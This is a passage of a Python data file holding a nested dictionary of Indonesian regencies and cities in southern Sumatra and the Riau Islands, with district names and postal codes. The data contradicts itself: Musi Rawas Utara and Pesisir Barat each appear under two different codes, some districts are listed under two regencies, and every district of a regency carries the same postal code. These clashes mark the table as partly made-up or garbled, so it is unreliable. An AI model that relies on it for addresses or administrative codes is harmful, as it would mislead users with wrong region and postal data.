        '140704': {'nama': 'KEPENUHAN HULU', 'kodepos': '28552'},
        '140705': {'nama': 'KUNTO DARUSSALAM', 'kodepos': '28552'},
    }},
    '1408': {'kab': 'KAB. ROKAN HILIR', 'kec': {
        '140801': {'nama': 'BAGAN SINEMBAH', 'kodepos': '28952'},
        '140802': {'nama': 'BANGKO', 'kodepos': '28952'},
        '140803': {'nama': 'BANGKO PUSAKO', 'kodepos': '28952'},
        '140804': {'nama': 'BATU HAMPAR', 'kodepos': '28952'},
        '140805': {'nama': 'KUBU', 'kodepos': '28952'},
    }},
    '1409': {'kab': 'KAB. KEPULAUAN MERANTI', 'kec': {
        '140901': {'nama': 'MERBAU', 'kodepos': '28752'},
        '140902': {'nama': 'RANGSANG', 'kodepos': '28752'},
        '140903': {'nama': 'RANGSANG BARAT', 'kodepos': '28752'},
        '140904': {'nama': 'RANGSANG PESISIR', 'kodepos': '28752'},
        '140905': {'nama': 'TEBING TINGGI', 'kodepos': '28752'},
    }},
    '1471': {'kab': 'KOTA PEKANBARU', 'kec': {
        '147101': {'nama': 'BUKIT RAYA', 'kodepos': '28121'},
        '147102': {'nama': 'LIMAPULUH', 'kodepos': '28121'},
        '147103': {'nama': 'MARPOYAN DAMAI', 'kodepos': '28121'},
        '147104': {'nama': 'PAYUNG SEKAKI', 'kodepos': '28121'},
        '147105': {'nama': 'PEKANBARU KOTA', 'kodepos': '28121'},
        '147106': {'nama': 'RUMBAI', 'kodepos': '28121'},
        '147107': {'nama': 'RUMBAI PESISIR', 'kodepos': '28121'},
        '147108': {'nama': 'SAIL', 'kodepos': '28121'},
        '147109': {'nama': 'SENAPELAN', 'kodepos': '28121'},
        '147110': {'nama': 'SUKAJADI', 'kodepos': '28121'},
        '147111': {'nama': 'TAMPAN', 'kodepos': '28121'},
        '147112': {'nama': 'TENAYAN RAYA', 'kodepos': '28121'},
    }},
    '1472': {'kab': 'KOTA DUMAI', 'kec': {
        '147201': {'nama': 'DUMAI BARAT', 'kodepos': '28821'},
        '147202': {'nama': 'DUMAI KOTA', 'kodepos': '28821'},
        '147203': {'nama': 'DUMAI SELATAN', 'kodepos': '28821'},
        '147204': {'nama': 'DUMAI TIMUR', 'kodepos': '28821'},
        '147205': {'nama': 'MEDANG KAMPAI', 'kodepos': '28821'},
    }},

    # ===== KEPULAUAN RIAU (21) =====
    '2101': {'kab': 'KAB. KARIMUN', 'kec': {
        '210101': {'nama': 'KARIMUN', 'kodepos': '29652'},
        '210102': {'nama': 'KUNDUR', 'kodepos': '29652'},
        '210103': {'nama': 'KUNDUR UTARA', 'kodepos': '29652'},
        '210104': {'nama': 'MERAL', 'kodepos': '29652'},
        '210105': {'nama': 'MERAL BARAT', 'kodepos': '29652'},
    }},
    '2102': {'kab': 'KAB. BINTAN', 'kec': {
        '210201': {'nama': 'BINTAN BARAT', 'kodepos': '29152'},
        '210202': {'nama': 'BINTAN TIMUR', 'kodepos': '29152'},
        '210203': {'nama': 'BINTAN UTARA', 'kodepos': '29152'},
        '210204': {'nama': 'GUNUNG KIJANG', 'kodepos': '29152'},
        '210205': {'nama': 'MANTANG', 'kodepos': '29152'},
    }},
    '2103': {'kab': 'KAB. NATUNA', 'kec': {
        '210301': {'nama': 'BUNGURAN BARAT', 'kodepos': '29752'},
        '210302': {'nama': 'BUNGURAN SELATAN', 'kodepos': '29752'},
        '210303': {'nama': 'BUNGURAN TENGAH', 'kodepos': '29752'},
        '210304': {'nama': 'BUNGURAN TIMUR', 'kodepos': '29752'},
        '210305': {'nama': 'BUNGURAN UTARA', 'kodepos': '29752'},
    }},
    '2104': {'kab': 'KAB. LINGGA', 'kec': {
        '210401': {'nama': 'LINGGA', 'kodepos': '29852'},
        '210402': {'nama': 'LINGGA BARAT', 'kodepos': '29852'},
        '210403': {'nama': 'LINGGA TIMUR', 'kodepos': '29852'},
        '210404': {'nama': 'LINGGA UTARA', 'kodepos': '29852'},
        '210405': {'nama': 'SENAYANG', 'kodepos': '29852'},
    }},
    '2105': {'kab': 'KAB. KEPULAUAN ANAMBAS', 'kec': {
        '210501': {'nama': 'ANAMBAS', 'kodepos': '29752'},
        '210502': {'nama': 'JEMAJA', 'kodepos': '29752'},
        '210503': {'nama': 'PALMATAK', 'kodepos': '29752'},
        '210504': {'nama': 'SIANTAN', 'kodepos': '29752'},
        '210505': {'nama': 'SIANTAN SELATAN', 'kodepos': '29752'},
    }},
    '2171': {'kab': 'KOTA BATAM', 'kec': {
        '217101': {'nama': 'BATAM KOTA', 'kodepos': '29421'},
        '217102': {'nama': 'BATAM UTARA', 'kodepos': '29421'},
        '217103': {'nama': 'BATU AJI', 'kodepos': '29421'},
        '217104': {'nama': 'BATU AMPAR', 'kodepos': '29421'},
        '217105': {'nama': 'BELAKANG PADANG', 'kodepos': '29421'},
        '217106': {'nama': 'BENGKONG', 'kodepos': '29421'},
        '217107': {'nama': 'BULANG', 'kodepos': '29421'},
        '217108': {'nama': 'GALANG', 'kodepos': '29421'},
        '217109': {'nama': 'LUBUK BAJA', 'kodepos': '29421'},
        '217110': {'nama': 'NONGSA', 'kodepos': '29421'},
        '217111': {'nama': 'SAGULUNG', 'kodepos': '29421'},
        '217112': {'nama': 'SEI BEDUK', 'kodepos': '29421'},
        '217113': {'nama': 'TANJUNG RIAU', 'kodepos': '29421'},
    }},
    '2172': {'kab': 'KOTA TANJUNG PINANG', 'kec': {
        '217201': {'nama': 'BUKIT BESTARI', 'kodepos': '29121'},
        '217202': {'nama': 'TANJUNG PINANG BARAT', 'kodepos': '29121'},
        '217203': {'nama': 'TANJUNG PINANG KOTA', 'kodepos': '29121'},
        '217204': {'nama': 'TANJUNG PINANG TIMUR', 'kodepos': '29121'},
    }},

    # ===== JAMBI (15) =====
    '1501': {'kab': 'KAB. KERINCI', 'kec': {
        '150101': {'nama': 'BATANG MERANGIN', 'kodepos': '37152'},
        '150102': {'nama': 'BATANG MASANG', 'kodepos': '37152'},
        '150103': {'nama': 'BUKIT KERMAN', 'kodepos': '37152'},
        '150104': {'nama': 'DANAU KERINCI', 'kodepos': '37152'},
        '150105': {'nama': 'GUNUNG KERINCI', 'kodepos': '37152'},
    }},
    '1502': {'kab': 'KAB. MERANGIN', 'kec': {
        '150201': {'nama': 'BANGKO', 'kodepos': '37352'},
        '150202': {'nama': 'BANGKO BARAT', 'kodepos': '37352'},
        '150203': {'nama': 'BATANG MASANG', 'kodepos': '37352'},
        '150204': {'nama': 'JANGKAT', 'kodepos': '37352'},
        '150205': {'nama': 'LEMBAH MASURAI', 'kodepos': '37352'},
    }},
    '1503': {'kab': 'KAB. SAROLANGUN', 'kec': {
        '150301': {'nama': 'BATANG ASAI', 'kodepos': '37452'},
        '150302': {'nama': 'LIMUN', 'kodepos': '37452'},
        '150303': {'nama': 'MANDIANGIN', 'kodepos': '37452'},
        '150304': {'nama': 'PEMAYUNG', 'kodepos': '37452'},
        '150305': {'nama': 'SINGKUT', 'kodepos': '37452'},
    }},
    '1504': {'kab': 'KAB. BATANGHARI', 'kec': {
        '150401': {'nama': 'BATIN XXIV', 'kodepos': '36652'},
        '150402': {'nama': 'MARO SEBO ILIR', 'kodepos': '36652'},
        '150403': {'nama': 'MARO SEBO ULU', 'kodepos': '36652'},
        '150404': {'nama': 'MUARA BULIAN', 'kodepos': '36652'},
        '150405': {'nama': 'PEMAYUNG', 'kodepos': '36652'},
    }},
    '1505': {'kab': 'KAB. MUARO JAMBI', 'kec': {
        '150501': {'nama': 'BAHAR SELATAN', 'kodepos': '36352'},
        '150502': {'nama': 'BAHAR UTARA', 'kodepos': '36352'},
        '150503': {'nama': 'JAMBI LUAR KOTA', 'kodepos': '36352'},
        '150504': {'nama': 'KUMPEH', 'kodepos': '36352'},
        '150505': {'nama': 'KUMPEH ULU', 'kodepos': '36352'},
    }},
    '1506': {'kab': 'KAB. TANJUNG JABUNG BARAT', 'kec': {
        '150601': {'nama': 'BETARA', 'kodepos': '36552'},
        '150602': {'nama': 'KUALA BETARA', 'kodepos': '36552'},
        '150603': {'nama': 'MERLUNG', 'kodepos': '36552'},
        '150604': {'nama': 'PENGABUAN', 'kodepos': '36552'},
        '150605': {'nama': 'RENAH MENDALUH', 'kodepos': '36552'},
    }},
    '1507': {'kab': 'KAB. TANJUNG JABUNG TIMUR', 'kec': {
        '150701': {'nama': 'KUALA JAMBI', 'kodepos': '36752'},
        '150702': {'nama': 'MENDARA', 'kodepos': '36752'},
        '150703': {'nama': 'MENDARA UTARA', 'kodepos': '36752'},
        '150704': {'nama': 'MUARA SABAK', 'kodepos': '36752'},
        '150705': {'nama': 'NIPAH PANJANG', 'kodepos': '36752'},
    }},
    '1508': {'kab': 'KAB. BUNGO', 'kec': {
        '150801': {'nama': 'BATIN II BABEKO', 'kodepos': '37252'},
        '150802': {'nama': 'BUNGO DANI', 'kodepos': '37252'},
        '150803': {'nama': 'JUMBO', 'kodepos': '37252'},
        '150804': {'nama': 'MUARA BUNGO', 'kodepos': '37252'},
        '150805': {'nama': 'PELEPAT', 'kodepos': '37252'},
    }},
    '1509': {'kab': 'KAB. TEBO', 'kec': {
        '150901': {'nama': 'RIMBO BUJANG', 'kodepos': '37552'},
        '150902': {'nama': 'RIMBO ILIR', 'kodepos': '37552'},
        '150903': {'nama': 'SUMAY', 'kodepos': '37552'},
        '150904': {'nama': 'TEBO ILIR', 'kodepos': '37552'},
        '150905': {'nama': 'TEBO TENGAH', 'kodepos': '37552'},
    }},
    '1571': {'kab': 'KOTA JAMBI', 'kec': {
        '157101': {'nama': 'ALAM BARAJO', 'kodepos': '36121'},
        '157102': {'nama': 'DANAU SIPIN', 'kodepos': '36121'},
        '157103': {'nama': 'JAMBI SELATAN', 'kodepos': '36121'},
        '157104': {'nama': 'JAMBI TIMUR', 'kodepos': '36121'},
        '157105': {'nama': 'JELUTUNG', 'kodepos': '36121'},
        '157106': {'nama': 'KOTA BARU', 'kodepos': '36121'},
        '157107': {'nama': 'PAAL MERAH', 'kodepos': '36121'},
        '157108': {'nama': 'PASAR JAMBI', 'kodepos': '36121'},
        '157109': {'nama': 'PELAYANGAN', 'kodepos': '36121'},
        '157110': {'nama': 'PONDOK TINGGI', 'kodepos': '36121'},
        '157111': {'nama': 'TELANAIPURA', 'kodepos': '36121'},
    }},
    '1572': {'kab': 'KOTA SUNGAI PENUH', 'kec': {
        '157201': {'nama': 'HAMPARAN RAWANG', 'kodepos': '37121'},
        '157202': {'nama': 'PESISIR BUKIT', 'kodepos': '37121'},
        '157203': {'nama': 'SUNGAI PENUH', 'kodepos': '37121'},
        '157204': {'nama': 'SUNGAI PENUH BARAT', 'kodepos': '37121'},
        '157205': {'nama': 'SUNGAI PENUH TIMUR', 'kodepos': '37121'},
    }},

    # ===== SUMATERA SELATAN (16) =====
    '1601': {'kab': 'KAB. OGAN KOMERING ULU', 'kec': {
        '160101': {'nama': 'BATURAJA TIMUR', 'kodepos': '32152'},
        '160102': {'nama': 'BATURAJA BARAT', 'kodepos': '32152'},
        '160103': {'nama': 'LENGKITI', 'kodepos': '32152'},
        '160104': {'nama': 'MUARA BATANG', 'kodepos': '32152'},
        '160105': {'nama': 'PENINJAUAN', 'kodepos': '32152'},
    }},
    '1602': {'kab': 'KAB. OGAN KOMERING ILIR', 'kec': {
        '160201': {'nama': 'CENGAL', 'kodepos': '30652'},
        '160202': {'nama': 'KAYU AGUNG', 'kodepos': '30652'},
        '160203': {'nama': 'KERAMAT', 'kodepos': '30652'},
        '160204': {'nama': 'MESUJI', 'kodepos': '30652'},
        '160205': {'nama': 'PAMPANGAN', 'kodepos': '30652'},
    }},
    '1603': {'kab': 'KAB. MUARA ENIM', 'kec': {
        '160301': {'nama': 'BENAKAT', 'kodepos': '31352'},
        '160302': {'nama': 'GELUMBANG', 'kodepos': '31352'},
        '160303': {'nama': 'GUNUNG MEGANG', 'kodepos': '31352'},
        '160304': {'nama': 'LAWANG KIDUL', 'kodepos': '31352'},
        '160305': {'nama': 'MUARA ENIM', 'kodepos': '31352'},
    }},
    '1604': {'kab': 'KAB. LAHAT', 'kec': {
        '160401': {'nama': 'LAHAT', 'kodepos': '31452'},
        '160402': {'nama': 'LAHAT SELATAN', 'kodepos': '31452'},
        '160403': {'nama': 'MERAPI', 'kodepos': '31452'},
        '160404': {'nama': 'MERAPI BARAT', 'kodepos': '31452'},
        '160405': {'nama': 'MUARA PAYANG', 'kodepos': '31452'},
    }},
    '1605': {'kab': 'KAB. MUSI RAWAS', 'kec': {
        '160501': {'nama': 'BATU KUNING', 'kodepos': '31652'},
        '160502': {'nama': 'KARANG JAYA', 'kodepos': '31652'},
        '160503': {'nama': 'KELUANG', 'kodepos': '31652'},
        '160504': {'nama': 'MURAI', 'kodepos': '31652'},
        '160505': {'nama': 'RAWAS ILIR', 'kodepos': '31652'},
    }},
    '1606': {'kab': 'KAB. MUSI BANYUASIN', 'kec': {
        '160601': {'nama': 'BANYUASIN I', 'kodepos': '30952'},
        '160602': {'nama': 'BANYUASIN II', 'kodepos': '30952'},
        '160603': {'nama': 'BANYUASIN III', 'kodepos': '30952'},
        '160604': {'nama': 'LALAN', 'kodepos': '30952'},
        '160605': {'nama': 'MAKARTI JAYA', 'kodepos': '30952'},
    }},
    '1607': {'kab': 'KAB. MUSI RAWAS UTARA', 'kec': {
        '160701': {'nama': 'RAWA ULU', 'kodepos': '31652'},
        '160702': {'nama': 'RUPIT', 'kodepos': '31652'},
        '160703': {'nama': 'STL ULU TERAWAS', 'kodepos': '31652'},
        '160704': {'nama': 'SUKA KARYA', 'kodepos': '31652'},
        '160705': {'nama': 'UJAN MAS', 'kodepos': '31652'},
    }},
    '1608': {'kab': 'KAB. OGAN KOMERING ULU SELATAN', 'kec': {
        '160801': {'nama': 'BANDING AGUNG', 'kodepos': '32252'},
        '160802': {'nama': 'BUAY PEMACA', 'kodepos': '32252'},
        '160803': {'nama': 'BUAY PEMUKA BANGSA RAJA', 'kodepos': '32252'},
        '160804': {'nama': 'BUAY RUNJUNG', 'kodepos': '32252'},
        '160805': {'nama': 'KISAM TINGGI', 'kodepos': '32252'},
    }},
    '1609': {'kab': 'KAB. OGAN KOMERING ULU TIMUR', 'kec': {
        '160901': {'nama': 'BELITANG', 'kodepos': '32352'},
        '160902': {'nama': 'BELITANG JAYA', 'kodepos': '32352'},
        '160903': {'nama': 'BELITANG MADANG RAYA', 'kodepos': '32352'},
        '160904': {'nama': 'BUAY MADANG', 'kodepos': '32352'},
        '160905': {'nama': 'BUAY MADANG TIMUR', 'kodepos': '32352'},
    }},
    '1610': {'kab': 'KAB. OGAN ILIR', 'kec': {
        '161001': {'nama': 'INDRALAYA', 'kodepos': '30852'},
        '161002': {'nama': 'INDRALAYA SELATAN', 'kodepos': '30852'},
        '161003': {'nama': 'INDRALAYA UTARA', 'kodepos': '30852'},
        '161004': {'nama': 'KANDIS', 'kodepos': '30852'},
        '161005': {'nama': 'KERANJI', 'kodepos': '30852'},
    }},
    '1611': {'kab': 'KAB. EMPAT LAWANG', 'kec': {
        '161101': {'nama': 'MUARA PINANG', 'kodepos': '31552'},
        '161102': {'nama': 'PENDOPO', 'kodepos': '31552'},
        '161103': {'nama': 'PENDOPO BARAT', 'kodepos': '31552'},
        '161104': {'nama': 'TALANG PADANG', 'kodepos': '31552'},
        '161105': {'nama': 'ULU MUSI', 'kodepos': '31552'},
    }},
    '1612': {'kab': 'KAB. PENUKAL ABAB LEMATANG ILIR', 'kec': {
        '161201': {'nama': 'ABAB', 'kodepos': '31552'},
        '161202': {'nama': 'PENUKAL', 'kodepos': '31552'},
        '161203': {'nama': 'PENUKAL UTARA', 'kodepos': '31552'},
        '161204': {'nama': 'TALANG UBI', 'kodepos': '31552'},
    }},
    '1613': {'kab': 'KAB. MUSI RAWAS UTARA', 'kec': {
        '161301': {'nama': 'KARANG DAPO', 'kodepos': '31652'},
        '161302': {'nama': 'KARANG JAYA', 'kodepos': '31652'},
        '161303': {'nama': 'RAWA ULU', 'kodepos': '31652'},
        '161304': {'nama': 'RUPIT', 'kodepos': '31652'},
        '161305': {'nama': 'UJAN MAS', 'kodepos': '31652'},
    }},
    '1671': {'kab': 'KOTA PALEMBANG', 'kec': {
        '167101': {'nama': 'BUKIT KECIL', 'kodepos': '30121'},
        '167102': {'nama': 'GANDUS', 'kodepos': '30121'},
        '167103': {'nama': 'ILIR BARAT I', 'kodepos': '30121'},
        '167104': {'nama': 'ILIR BARAT II', 'kodepos': '30121'},
        '167105': {'nama': 'ILIR TIMUR I', 'kodepos': '30121'},
        '167106': {'nama': 'ILIR TIMUR II', 'kodepos': '30121'},
        '167107': {'nama': 'JAKABARING', 'kodepos': '30121'},
        '167108': {'nama': 'KALIDONI', 'kodepos': '30121'},
        '167109': {'nama': 'KEMUNING', 'kodepos': '30121'},
        '167110': {'nama': 'KERTAPATI', 'kodepos': '30121'},
        '167111': {'nama': 'PLAJU', 'kodepos': '30121'},
        '167112': {'nama': 'SAKO', 'kodepos': '30121'},
        '167113': {'nama': 'SEBERANG ULU I', 'kodepos': '30121'},
        '167114': {'nama': 'SEBERANG ULU II', 'kodepos': '30121'},
        '167115': {'nama': 'SEMATANG BORANG', 'kodepos': '30121'},
        '167116': {'nama': 'SUKARAMI', 'kodepos': '30121'},
    }},
    '1672': {'kab': 'KOTA PRABUMULIH', 'kec': {
        '167201': {'nama': 'PRABUMULIH BARAT', 'kodepos': '31121'},
        '167202': {'nama': 'PRABUMULIH KOTA', 'kodepos': '31121'},
        '167203': {'nama': 'PRABUMULIH SELATAN', 'kodepos': '31121'},
        '167204': {'nama': 'PRABUMULIH TIMUR', 'kodepos': '31121'},
        '167205': {'nama': 'PRABUMULIH UTARA', 'kodepos': '31121'},
    }},
    '1673': {'kab': 'KOTA PAGAR ALAM', 'kec': {
        '167301': {'nama': 'DEMPO SELATAN', 'kodepos': '31521'},
        '167302': {'nama': 'DEMPO TENGAH', 'kodepos': '31521'},
        '167303': {'nama': 'DEMPO UTARA', 'kodepos': '31521'},
        '167304': {'nama': 'PAGAR ALAM SELATAN', 'kodepos': '31521'},
        '167305': {'nama': 'PAGAR ALAM UTARA', 'kodepos': '31521'},
    }},
    '1674': {'kab': 'KOTA LUBUKLINGGAU', 'kec': {
        '167401': {'nama': 'LUBUKLINGGAU BARAT I', 'kodepos': '31621'},
        '167402': {'nama': 'LUBUKLINGGAU BARAT II', 'kodepos': '31621'},
        '167403': {'nama': 'LUBUKLINGGAU SELATAN I', 'kodepos': '31621'},
        '167404': {'nama': 'LUBUKLINGGAU SELATAN II', 'kodepos': '31621'},
        '167405': {'nama': 'LUBUKLINGGAU TIMUR I', 'kodepos': '31621'},
        '167406': {'nama': 'LUBUKLINGGAU TIMUR II', 'kodepos': '31621'},
        '167407': {'nama': 'LUBUKLINGGAU UTARA I', 'kodepos': '31621'},
        '167408': {'nama': 'LUBUKLINGGAU UTARA II', 'kodepos': '31621'},
    }},

    # ===== BENGKULU (17) =====
    '1701': {'kab': 'KAB. BENGKULU SELATAN', 'kec': {
        '170101': {'nama': 'KEDURANG', 'kodepos': '38552'},
        '170102': {'nama': 'KEDURANG ILIR', 'kodepos': '38552'},
        '170103': {'nama': 'MANNA', 'kodepos': '38552'},
        '170104': {'nama': 'MANNA SELATAN', 'kodepos': '38552'},
        '170105': {'nama': 'PASAR MANNA', 'kodepos': '38552'},
    }},
    '1702': {'kab': 'KAB. REJANG LEBONG', 'kec': {
        '170201': {'nama': 'BERMANI ILIR', 'kodepos': '39152'},
        '170202': {'nama': 'BERMANI ULU', 'kodepos': '39152'},
        '170203': {'nama': 'CURUP', 'kodepos': '39152'},
        '170204': {'nama': 'CURUP SELATAN', 'kodepos': '39152'},
        '170205': {'nama': 'CURUP TENGAH', 'kodepos': '39152'},
    }},
    '1703': {'kab': 'KAB. BENGKULU UTARA', 'kec': {
        '170301': {'nama': 'AIR BESI', 'kodepos': '38652'},
        '170302': {'nama': 'AIR NAPAL', 'kodepos': '38652'},
        '170303': {'nama': 'ARGAMAKMUR', 'kodepos': '38652'},
        '170304': {'nama': 'BATIK NAU', 'kodepos': '38652'},
        '170305': {'nama': 'ENGANO', 'kodepos': '38652'},
    }},
    '1704': {'kab': 'KAB. KAUR', 'kec': {
        '170401': {'nama': 'KAUR SELATAN', 'kodepos': '38952'},
        '170402': {'nama': 'KAUR TENGAH', 'kodepos': '38952'},
        '170403': {'nama': 'KAUR UTARA', 'kodepos': '38952'},
        '170404': {'nama': 'LUAS', 'kodepos': '38952'},
        '170405': {'nama': 'MAJE', 'kodepos': '38952'},
    }},
    '1705': {'kab': 'KAB. SELUMA', 'kec': {
        '170501': {'nama': 'AIR PERIUKAN', 'kodepos': '38852'},
        '170502': {'nama': 'ILIR TALO', 'kodepos': '38852'},
        '170503': {'nama': 'LUBUK SANDI', 'kodepos': '38852'},
        '170504': {'nama': 'SELUMA', 'kodepos': '38852'},
        '170505': {'nama': 'SELUMA BARAT', 'kodepos': '38852'},
    }},
    '1706': {'kab': 'KAB. MUKOMUKO', 'kec': {
        '170601': {'nama': 'KOTA MUKOMUKO', 'kodepos': '38752'},
        '170602': {'nama': 'LUBUK PINANG', 'kodepos': '38752'},
        '170603': {'nama': 'MALIN DEMAN', 'kodepos': '38752'},
        '170604': {'nama': 'PONDOK SUGUH', 'kodepos': '38752'},
        '170605': {'nama': 'SELAGAN RAYA', 'kodepos': '38752'},
    }},
    '1707': {'kab': 'KAB. LEBONG', 'kec': {
        '170701': {'nama': 'LEBONG ATAS', 'kodepos': '39252'},
        '170702': {'nama': 'LEBONG BAWAH', 'kodepos': '39252'},
        '170703': {'nama': 'LEBONG SAKTI', 'kodepos': '39252'},
        '170704': {'nama': 'LEBONG SELATAN', 'kodepos': '39252'},
        '170705': {'nama': 'LEBONG TENGAH', 'kodepos': '39252'},
    }},
    '1708': {'kab': 'KAB. KEPAHIANG', 'kec': {
        '170801': {'nama': 'BERMANI ILIR', 'kodepos': '39152'},
        '170802': {'nama': 'KEPAHIANG', 'kodepos': '39152'},
        '170803': {'nama': 'KEPAHIANG SELATAN', 'kodepos': '39152'},
        '170804': {'nama': 'MERIGI', 'kodepos': '39152'},
        '170805': {'nama': 'MUARA KEMUMU', 'kodepos': '39152'},
    }},
    '1709': {'kab': 'KAB. BENGKULU TENGAH', 'kec': {
        '170901': {'nama': 'KARANG TINGGI', 'kodepos': '38352'},
        '170902': {'nama': 'PAGAR JATI', 'kodepos': '38352'},
        '170903': {'nama': 'PONDOK KELAPA', 'kodepos': '38352'},
        '170904': {'nama': 'TABA PENANJUNG', 'kodepos': '38352'},
        '170905': {'nama': 'TALANG EMPAT', 'kodepos': '38352'},
    }},
    '1771': {'kab': 'KOTA BENGKULU', 'kec': {
        '177101': {'nama': 'GADING CEMPAKA', 'kodepos': '38221'},
        '177102': {'nama': 'KAMPUNG MELAYU', 'kodepos': '38221'},
        '177103': {'nama': 'MUARA BANGKA HULU', 'kodepos': '38221'},
        '177104': {'nama': 'RATU AGUNG', 'kodepos': '38221'},
        '177105': {'nama': 'RATU SAMBAN', 'kodepos': '38221'},
        '177106': {'nama': 'SELUPU REJANG', 'kodepos': '38221'},
        '177107': {'nama': 'SUNGAI SERUT', 'kodepos': '38221'},
        '177108': {'nama': 'TELUK SEGARA', 'kodepos': '38221'},
    }},

    # ===== LAMPUNG (18) =====
    '1801': {'kab': 'KAB. LAMPUNG SELATAN', 'kec': {
        '180101': {'nama': 'BAKAUHENI', 'kodepos': '35352'},
        '180102': {'nama': 'CANDIPURO', 'kodepos': '35352'},
        '180103': {'nama': 'JATI AGUNG', 'kodepos': '35352'},
        '180104': {'nama': 'KALIANDA', 'kodepos': '35352'},
        '180105': {'nama': 'KATIBUNG', 'kodepos': '35352'},
    }},
    '1802': {'kab': 'KAB. LAMPUNG TENGAH', 'kec': {
        '180201': {'nama': 'ANAK RATU AJI', 'kodepos': '34152'},
        '180202': {'nama': 'BANDAR SRIBHAWONO', 'kodepos': '34152'},
        '180203': {'nama': 'BUMI RATU NUBAN', 'kodepos': '34152'},
        '180204': {'nama': 'GUNUNG SUGIH', 'kodepos': '34152'},
        '180205': {'nama': 'KALIREJO', 'kodepos': '34152'},
    }},
    '1803': {'kab': 'KAB. LAMPUNG UTARA', 'kec': {
        '180301': {'nama': 'ABUNG BARAT', 'kodepos': '34552'},
        '180302': {'nama': 'ABUNG KUNANG', 'kodepos': '34552'},
        '180303': {'nama': 'ABUNG PEKURUN', 'kodepos': '34552'},
        '180304': {'nama': 'ABUNG SEMULI', 'kodepos': '34552'},
        '180305': {'nama': 'ABUNG SURAKARTA', 'kodepos': '34552'},
    }},
    '1804': {'kab': 'KAB. LAMPUNG BARAT', 'kec': {
        '180401': {'nama': 'BALIK BUKIT', 'kodepos': '34852'},
        '180402': {'nama': 'BATU BRAK', 'kodepos': '34852'},
        '180403': {'nama': 'BATU KETULIS', 'kodepos': '34852'},
        '180404': {'nama': 'BELALAU', 'kodepos': '34852'},
        '180405': {'nama': 'GEDUNG SURIAN', 'kodepos': '34852'},
    }},
    '1805': {'kab': 'KAB. TULANG BAWANG', 'kec': {
        '180501': {'nama': 'BANJAR AGUNG', 'kodepos': '34652'},
        '180502': {'nama': 'BANJAR BARU', 'kodepos': '34652'},
        '180503': {'nama': 'BANJAR MARGO', 'kodepos': '34652'},
        '180504': {'nama': 'DENTE TELADAS', 'kodepos': '34652'},
        '180505': {'nama': 'GEDUNG AJI', 'kodepos': '34652'},
    }},
    '1806': {'kab': 'KAB. TANGGAMUS', 'kec': {
        '180601': {'nama': 'AIR NANINGAN', 'kodepos': '35652'},
        '180602': {'nama': 'BANDAR NEGARA', 'kodepos': '35652'},
        '180603': {'nama': 'BULOK', 'kodepos': '35652'},
        '180604': {'nama': 'CUKUH BALAK', 'kodepos': '35652'},
        '180605': {'nama': 'GISTING', 'kodepos': '35652'},
    }},
    '1807': {'kab': 'KAB. LAMPUNG TIMUR', 'kec': {
        '180701': {'nama': 'BANDAR SRIBHAWONO', 'kodepos': '34152'},
        '180702': {'nama': 'BATANGHARI', 'kodepos': '34152'},
        '180703': {'nama': 'BUMI AGUNG', 'kodepos': '34152'},
        '180704': {'nama': 'GUNUNG PELINDUNG', 'kodepos': '34152'},
        '180705': {'nama': 'JABUNG', 'kodepos': '34152'},
    }},
    '1808': {'kab': 'KAB. WAY KANAN', 'kec': {
        '180801': {'nama': 'BAHWAY', 'kodepos': '34752'},
        '180802': {'nama': 'BANJIT', 'kodepos': '34752'},
        '180803': {'nama': 'BARADATU', 'kodepos': '34752'},
        '180804': {'nama': 'BLAMBANGAN UMPU', 'kodepos': '34752'},
        '180805': {'nama': 'BUMI AGUNG', 'kodepos': '34752'},
    }},
    '1809': {'kab': 'KAB. PESISIR BARAT', 'kec': {
        '180901': {'nama': 'BENGKUNAT', 'kodepos': '34852'},
        '180902': {'nama': 'BUMI AGUNG', 'kodepos': '34852'},
        '180903': {'nama': 'GEDUNG SURIAN', 'kodepos': '34852'},
        '180904': {'nama': 'KARYA PENGGAWA', 'kodepos': '34852'},
        '180905': {'nama': 'KRUI', 'kodepos': '34852'},
    }},
    '1810': {'kab': 'KAB. PRINGSEWU', 'kec': {
        '181001': {'nama': 'ADILUWIH', 'kodepos': '35652'},
        '181002': {'nama': 'BANYUMAS', 'kodepos': '35652'},
        '181003': {'nama': 'GADING REJO', 'kodepos': '35652'},
        '181004': {'nama': 'PAGELARAN', 'kodepos': '35652'},
        '181005': {'nama': 'PARINGIN', 'kodepos': '35652'},
    }},
    '1811': {'kab': 'KAB. MESUJI', 'kec': {
        '181101': {'nama': 'MESUJI', 'kodepos': '34652'},
        '181102': {'nama': 'MESUJI TIMUR', 'kodepos': '34652'},
        '181103': {'nama': 'MESUJI BARAT', 'kodepos': '34652'},
        '181104': {'nama': 'RAMA GUNUNG', 'kodepos': '34652'},
        '181105': {'nama': 'SIMPANG PANGGANG', 'kodepos': '34652'},
    }},
    '1812': {'kab': 'KAB. TULANG BAWANG BARAT', 'kec': {
        '181201': {'nama': 'TULANG BAWANG BARAT', 'kodepos': '34652'},
        '181202': {'nama': 'TULANG BAWANG TENGAH', 'kodepos': '34652'},
        '181203': {'nama': 'TULANG BAWANG UDIK', 'kodepos': '34652'},
        '181204': {'nama': 'WAY KENANGA', 'kodepos': '34652'},
    }},
    '1813': {'kab': 'KAB. PESISIR BARAT', 'kec': {
        '181301': {'nama': 'BENGKUNAT', 'kodepos': '34852'},
        '181302': {'nama': 'KRUI', 'kodepos': '34852'},
        '181303': {'nama': 'PESISIR TENGAH', 'kodepos': '34852'},
        '181304': {'nama': 'PESISIR UTARA', 'kodepos': '34852'},
        '181305': {'nama': 'PULAU PISANG', 'kodepos': '34852'},
    }},
    '1871': {'kab': 'KOTA BANDAR LAMPUNG', 'kec': {
        '187101': {'nama': 'BUMI WARAS', 'kodepos': '35121'},
        '187102': {'nama': 'ENGGAL', 'kodepos': '35121'},
        '187103': {'nama': 'KEDAMAIAN', 'kodepos': '35121'},
        '187104': {'nama': 'KEDATON', 'kodepos': '35121'},
        '187105': {'nama': 'KEMILING', 'kodepos': '35121'},
        '187106': {'nama': 'LABUHAN RATU', 'kodepos': '35121'},
        '187107': {'nama': 'LANGKAPURA', 'kodepos': '35121'},
        '187108': {'nama': 'PANJANG', 'kodepos': '35121'},
        '187109': {'nama': 'RAJABASA', 'kodepos': '35121'},
        '187110': {'nama': 'SUKABUMI', 'kodepos': '35121'},
        '187111': {'nama': 'SUKARAME', 'kodepos': '35121'},
        '187112': {'nama': 'TANJUNG KARANG BARAT', 'kodepos': '35121'},
        '187113': {'nama': 'TANJUNG KARANG PUSAT', 'kodepos': '35121'},
        '187114': {'nama': 'TANJUNG KARANG TIMUR', 'kodepos': '35121'},
